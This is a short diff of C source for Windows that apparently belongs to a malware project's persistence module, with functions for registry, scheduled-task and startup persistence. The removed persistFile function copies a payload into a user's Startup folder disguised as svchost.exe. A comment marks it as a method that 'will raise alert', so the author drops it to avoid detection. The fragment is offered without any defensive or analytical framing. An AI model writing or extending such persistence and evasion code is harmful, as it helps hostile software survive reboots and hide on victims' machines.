@@ -4,7 +4,7 @@
 #include "oleauto.h"
 LPCSTR tempFile_path;
 
-int createTemp() {
+int createTemp(HCRYPTPROV hCryptProv) {
 	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
 	BYTE* randomBuffer = (BYTE*)calloc(16, 1);
 
@@ -79,18 +79,6 @@ int persistRegistry() {
 
 }
 
-// will raise alert
-int persistFile() {
-	if (createTemp() == -1) {
-		return -1;
-	}
-
-	if (!CopyFileA(tempFile_path, "C:\\Users\\DongChuong\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe", TRUE)) {
-		return -1;
-	}
-	return 0;
-}
-
 int persistSchedule(BOOL start) {
 	char finalCommand[MAX_PATH];
 
@@ -123,9 +111,9 @@ int environmentSetup() {
 	return 0;
 }
 
-int mainPersist(BOOL start) {
+int mainPersist(BOOL start, HCRYPTPROV hCryptProv) {
 	if (start) {
-		if (createTemp() == -1) {
+		if (createTemp(hCryptProv) == -1) {
 			return -1;
 		}
 
